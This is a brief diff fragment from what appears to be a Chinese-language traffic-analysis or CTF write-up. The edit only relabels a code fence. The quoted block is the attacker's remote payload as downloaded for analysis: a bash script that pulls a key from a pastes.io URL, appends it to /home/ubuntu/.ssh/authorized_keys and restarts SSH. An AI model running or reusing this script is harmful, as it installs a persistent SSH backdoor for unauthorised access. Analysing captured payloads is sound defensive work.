@@ -180,7 +180,7 @@ pastes.io
 
 对上文流量中使用的远程载荷 `https://pastes.io/raw/bx5gcr0et8` 下载下来进行分析
 
-```shell title="https://pastes.io/raw/bx5gcr0et8"
+```bash title="https://pastes.io/raw/bx5gcr0et8"
 #!/bin/bash
 curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
 sudo service ssh restart
